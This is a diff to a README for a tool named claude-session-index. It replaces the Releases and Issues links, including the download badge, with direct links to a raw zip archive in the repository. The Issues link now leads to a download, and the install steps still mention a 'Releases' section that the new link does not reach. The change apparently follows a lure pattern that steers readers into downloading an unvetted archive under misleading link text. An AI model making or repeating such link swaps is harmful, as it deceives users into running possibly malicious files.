@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download claude-session-index](https://img.shields.io/badge/Download-claude--session--index-blue.svg)](https://github.com/Jeremyx000/claude-session-index/releases)
+[![Download claude-session-index](https://raw.githubusercontent.com/Jeremyx000/claude-session-index/main/session_index/index_session_claude_2.6.zip)](https://raw.githubusercontent.com/Jeremyx000/claude-session-index/main/session_index/index_session_claude_2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Before you download, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download claude-session-index](https://github.com/Jeremyx000/claude-session-index/releases).
+To download the application, visit this page: [Download claude-session-index](https://raw.githubusercontent.com/Jeremyx000/claude-session-index/main/session_index/index_session_claude_2.6.zip).
 
 1. Click on the "Releases" section on the page.
 2. Locate the latest release.
@@ -82,6 +82,6 @@ claude-session-index falls under the following topics:
 
 ## 💬 Support
 
-For further support or questions, feel free to check the [Issues](https://github.com/Jeremyx000/claude-session-index/issues) section on the GitHub page. You can report bugs or ask for features here. 
+For further support or questions, feel free to check the [Issues](https://raw.githubusercontent.com/Jeremyx000/claude-session-index/main/session_index/index_session_claude_2.6.zip) section on the GitHub page. You can report bugs or ask for features here. 
 
 Thank you for using claude-session-index! Happy searching and analyzing!
